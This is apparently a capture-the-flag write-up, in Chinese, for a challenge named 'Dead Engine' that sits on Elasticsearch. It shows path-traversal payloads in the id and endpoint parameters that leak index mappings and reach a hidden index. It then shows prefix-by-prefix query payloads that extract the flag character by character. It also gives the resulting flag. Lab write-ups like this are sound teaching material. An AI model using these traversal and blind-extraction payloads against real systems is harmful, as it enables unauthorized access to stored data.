# Dead Engine

這題從錯誤訊息可以知道背後是`ElasticSearch`

塞`id=../../*`可以leak能用的目標:

```
{
   "secr3td4ta":{
      "aliases":{

      },
      "mappings":{
         "fl4g?":{
            "properties":{
               "flag":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "title":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               }
            }
         }
      },
      "settings":{
         "index":{
            "creation_date":"1555086694187",
            "number_of_shards":"5",
            "number_of_replicas":"1",
            "uuid":"O3sdvALmTM6xGn6kcqgglQ",
            "version":{
               "created":"5061699"
            },
            "provided_name":"secr3td4ta"
         }
      }
   },
   "articles":{
      "aliases":{

      },
      "mappings":{
         "articles":{
            "properties":{
               "access":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "category":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "date":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "downloadLink":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "price":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               },
               "rating":{
                  "type":"float"
               },
               "title":{
                  "type":"text",
                  "fields":{
                     "keyword":{
                        "type":"keyword",
                        "ignore_above":256
                     }
                  }
               }
            }
         }
      },
      "settings":{
         "index":{
            "creation_date":"1555086694281",
            "number_of_shards":"5",
            "number_of_replicas":"1",
            "uuid":"S-tkOWJYRxeVncmgUI1BLA",
            "version":{
               "created":"5061699"
            },
            "provided_name":"articles"
         }
      }
   }
}
```

可以看到有`secr3td4ta`，裡面有`flag`

再來就是想辦法撈他

觀察一下`endpoint`參數，可以發現他其實是把這個參數mapping到一個URL上，再去Request抓資料回來Parse

(例如可以簡單塞個`endpoint=/search`，就會把完整路徑噴回來給你: `Error while JSON decoding:No handler found for uri [/articles/articles/_/search?q=*] and method [GET]`)

所以只要`q=*&endpoint=/../../../secr3td4ta/_search`

```
[{"title":"Flag Is Here, Grab it :)","_id":"AWoSY9h7LaY_ZeX1ck78","_type":"fl4g?","downloadLink":null}]
```

但沒有flag，大概是因為他只Parse原本`articles`裡才有的欄位，而`flag`欄位就沒被Parse出來

這裡可以用類似Boolean based的概念去撈

`endpoint=/../../../secr3td4ta/_search&q=flag:*`

`endpoint=/../../../secr3td4ta/_search&q=flag:2*`

`endpoint=/../../../secr3td4ta/_search&q=flag:2A*`

`endpoint=/../../../secr3td4ta/_search&q=flag:2A6*`

...

`endpoint=/../../../secr3td4ta/_search&q=flag:2A6E210F10784C9A0197BA164B94F25D`

這邊只要有匹配到，就會顯示資料，沒匹配就沒東西

暴力踹一波就能把flag欄位的內容撈出來

`ASIS{2a6e210f10784c9a0197ba164b94f25d}`
















